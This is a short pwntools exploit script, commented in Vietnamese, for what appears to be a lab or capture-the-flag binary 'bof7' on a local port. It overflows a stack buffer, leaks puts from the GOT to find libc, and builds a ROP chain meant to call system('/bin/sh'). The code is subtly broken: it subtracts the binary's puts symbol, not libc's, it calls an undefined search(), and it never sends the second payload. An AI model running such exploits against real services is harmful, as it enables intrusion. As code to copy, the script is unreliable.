from pwn import*
exe = ELF('./bof7',checksec=False)
libc = ELF('./<libc_file>',checksec=False)
#p=process(exe.path)
p = remote('127.0.0.1',9993) #Connect đến server

#GOT && PLT
#Global offset table: Nơi chứa địa chỉ các hàm của libc
#Procedure Linkage Table: Là lệnh thực thi hàm được chứa ở GOT

pop_rdi = 0x0000000000401263

#Stage 1: Leak libc address
input()
payload = b'a'*88
payload+= p64(pop_rdi) + p64(exe.got['puts'])
payload+= p64(exe.plt['puts'])
payload+= p64(exe.sym['main'])

p.sendafter(b'something: \n',payload)

libc_leak = u64(p.recv(6)+b'\0\0')
libc.address = libc_leak - exe.sym['puts']
log.info('Libc_leak: '+ hex(libc_leak))
log.info('Libc_base: '+ hex(libc.address))

#Stage 2: Tạo shell
input()
payload = b'a'*88
payload+= p64(pop_rdi) + p64(next(search(b'/bin/sh')))
payload+= p64(exe.sym['system'])
#system('/bin/sh')

p.interactive()